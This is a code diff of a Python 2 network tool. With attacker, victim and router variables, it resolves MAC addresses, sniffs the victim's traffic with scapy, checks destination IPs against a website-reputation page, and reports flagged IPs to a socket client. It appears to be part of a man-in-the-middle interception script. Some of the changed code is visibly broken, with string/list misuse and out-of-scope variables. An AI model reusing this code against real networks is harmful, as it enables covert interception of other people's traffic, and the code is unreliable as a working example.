@@ -5,43 +5,40 @@ import threading
 import urllib2
 import BeautifulSoup
 import socket
+import multiprocessing
 
-attacker_ip='192.168.0.122'
-victim_mac=''
-router_mac=''
-attacker_mac=''
-router_ip=''
-victim_ip=''
-ips=[]
+attacker_ip='192.9.13.229'
 sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+contents=''
+victim_ip=''
+router_ip=''
+client=''
 
 def checking_ip(ip_address):
     scores={'Low Risk':1, 'Medium Risk':2, 'High Risk':5}
     score_sum=0
-    a=urllib2.urlopen('https://sitecheck.sucuri.net/results/'+ip_address)
-    html=BeautifulSoup.BeautifulSoup(a)
-    result=html.findAll('table', attrs={'class':'table scan-findings'})
-    if len(result) <=0:
-        return 0
-    result=result[0].findAll('td')
-    if result[2]=='Critical':
-        return 0
-    for i in range(len(result)/4):
-        try:
-            print result[i*4+2].text
-            score_sum+=scores[result[i*4+2].text]
-        except:
-            score_sum+=10
-    if score_sum > 5:
-        client, client_address=sock.accept()
-        client.send(ip_address+'\n')
-        with open('test.txt', 'a') as f:
-            f.write(ip_address+' ')
-
-def select_victim():
-    victim_ip=raw_input('Input victim IP')
-    router_ip=raw_input('Input router IP')
-    return (victim_ip, router_ip)
+    if ip_address in contents:
+        client.send(ip_address)
+    else:
+        a=urllib2.urlopen('https://sitecheck.sucuri.net/results/'+ip_address)
+        html=BeautifulSoup.BeautifulSoup(a)
+        result=html.findAll('table', attrs={'class':'table scan-findings'})
+        if len(result) <=0:
+            return 0
+        result=result[0].findAll('td')
+        if result[2]=='Critical':
+            return 0
+        for i in range(len(result)/4):
+            try:
+                print result[i*4+2].text
+                score_sum+=scores[result[i*4+2].text]
+            except:
+                score_sum+=10
+        if score_sum > 5:
+            client.send(ip_address)
+            with open('test.txt', 'a') as f:
+                f.write(ip_address+' ')
+            contents.append(ip_address)
 
 def getMac(host):
     a=subprocess.Popen(["arp", "-a"], stdout=subprocess.PIPE)
@@ -68,17 +65,18 @@ def pr(x):
         print x['IP'].dst
         checking_ip(x['IP'].dst)
 
-def sniffing():
+def sniffing(clients, victim_ip, contents):
     scapy.all.sniff(prn=pr)
 
-def main():
+def main(client, client_address):
     #if os.geteuid() != 0:
     #    sys.exit("[!] Please run as root")
-    IP=select_victim()
-    global victim_ip
-    victim_ip=IP[0]
-    router_ip=IP[1]
-
+    victim_ip=client_address[0]
+    router_ip=client.recv(1024)
+    print victim_ip, router_ip
+    with open('test.txt', 'r') as f:
+        contents=f.readline()
+    contents=contents.split(' ')
     if getMac(router_ip) == None:
         print 'We can not find router mac address'
         return
@@ -86,8 +84,7 @@ def main():
     if getMac(victim_ip) == None:
         print 'we can not find victim mac address'
         return
-
-    t=threading.Thread(target=sniffing)
+    t=threading.Thread(target=sniffing, args=(client, victim_ip, contents))
     t.start()
 
 
@@ -106,4 +103,6 @@ def main():
 if __name__ == '__main__':
     sock.bind((attacker_ip, 9876))
     sock.listen(5)
-    main()
+    client, client_address=sock.accept()
+    p=multiprocessing.Process(target=main, args=(client, client_address))
+    p.start()
